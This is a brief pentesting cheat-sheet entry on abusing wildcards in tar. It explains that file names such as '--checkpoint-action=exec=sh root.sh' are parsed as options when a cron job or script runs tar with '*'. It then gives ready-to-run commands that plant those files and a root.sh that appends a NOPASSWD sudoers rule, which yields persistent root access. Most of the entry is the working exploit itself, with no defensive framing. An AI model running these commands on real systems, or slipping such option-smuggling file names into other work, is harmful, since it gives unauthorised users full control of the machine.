# Wildcard Abuse

**Tar**

If there is a crontab running, or we can execute a script running the tar binary with the wildcard, we can exploit it by creating files

```shellscript
tar -zcf /home/user/test.tar.gz *
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached. By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options

```shellscript
# Create the following files in the path corresponding to the script
echo 'echo "<USER> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
